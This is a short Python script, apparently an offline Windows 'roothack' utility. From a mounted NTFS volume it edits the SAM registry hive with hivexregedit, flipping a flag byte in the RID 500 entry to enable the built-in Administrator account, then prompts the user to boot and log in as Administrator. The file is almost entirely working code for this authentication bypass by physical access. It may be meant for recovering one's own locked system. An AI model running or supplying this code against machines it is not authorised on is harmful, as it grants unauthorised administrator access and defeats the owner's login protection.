import os
import subprocess

WINDOWS_ROOT = {
    "Windows",
    "Users"
}

ELEVATED_ADMIN = r"\SAM\Domains\Account\Users\000001F4"

def write_temp_reg(hive):
    print("Writing...")
    subprocess.check_call(["hivexregedit", "--merge", hive, "temp.reg"])
    print("Ceaning up...")
    os.remove("temp.reg")

def roothack_windows(mountpoint):
    print("Windows roothack")
    HKLM_Sam_Hive = os.path.join(mountpoint, "Windows/System32/config/SAM")

    print("Hive:", HKLM_Sam_Hive)
    print("Exporting elevated admin...")
    
    export = subprocess.check_output(["hivexregedit", "--export", HKLM_Sam_Hive, ELEVATED_ADMIN]).decode("utf-8")
    values = export.split("\n")

    f = None
    for value in values:
        if value.startswith("\"F\"="):
            f = value[4:]
    bts = f.split(":", maxsplit=1)[1].split(",")

    print("Value:", bts)

    enabled = bts[56]
    if enabled == "10":
        print("System is already roothacked")
        if input("Do you wand to remove it (N/y)? ").lower() == "y":
            print("Creating temp.reg...")
            bts[56] = "11"
            contents = fr"""
[\SAM\Domains\Account\Users\000001F4]
"F"=hex(3):{",".join(bts)}
    """
            with open("temp.reg", "w") as f:
                f.write(contents)
            
            write_temp_reg(HKLM_Sam_Hive)
            print("Disabled ElevatedAdmin")

    if enabled != "11" and enabled != "10":
        print("Elevated Admin user is corrupted.")
        if input("Try to recover (The system may be damaged!) (N/y)? ").lower() == "y":
            enabled = "11"
        else:
            exit(1)

    if enabled == "11":
        print("Creating temp.reg...")
        bts[56] = "10"
        contents = fr"""
[\SAM\Domains\Account\Users\000001F4]
"F"=hex(3):{",".join(bts)}
"""
        with open("temp.reg", "w") as f:
            f.write(contents)

        write_temp_reg(HKLM_Sam_Hive)
        print("Enabled EvelatedAdmin")
        print("You can now boot back into the os log in as Administrator")
        print("This account can have diffrent names depending on the system language")

def is_windows(device):
    try:
        ls_output = subprocess.check_output(["sudo", "ntfsls", "-f", device]).decode("utf-8")
    except subprocess.CalledProcessError as e:
        print(e)
        return False
    ls_contents = ls_output.split("\n")
    if WINDOWS_ROOT.intersection(ls_contents) == WINDOWS_ROOT: # WINDOWS_ROOT is fully contained in ls_contents
        return True
    else:
        return False